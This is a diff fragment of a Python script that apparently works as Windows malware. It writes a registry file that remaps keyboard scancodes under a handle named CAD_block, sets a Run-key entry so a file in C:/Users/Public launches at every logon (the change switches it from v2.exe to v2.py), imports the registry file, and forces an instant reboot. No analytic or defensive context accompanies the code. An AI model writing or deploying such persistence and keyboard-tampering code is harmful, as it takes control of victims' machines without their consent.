@@ -49,6 +49,6 @@ except:
     c.close()
     CAD_block.write("Windows Registry Editor Version 5.00\n\n[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Keyboard Layout]\n\"Scancode Map\"=hex:00,00,00,00,00,00,00,00,03,00,00,00,38,00,5B,E0,5B,E0,38,00,00,00,00,00")
     CAD_block.close()
-    os.system("Reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v Auto /t REG_SZ /d \"C:/Users/Public/v2.exe\" /f")
+    os.system("Reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v Auto /t REG_SZ /d \"C:/Users/Public/v2.py\" /f")
     os.system("C:/Users/Public/change.reg")
     os.system("shutdown -r -f -t 0")
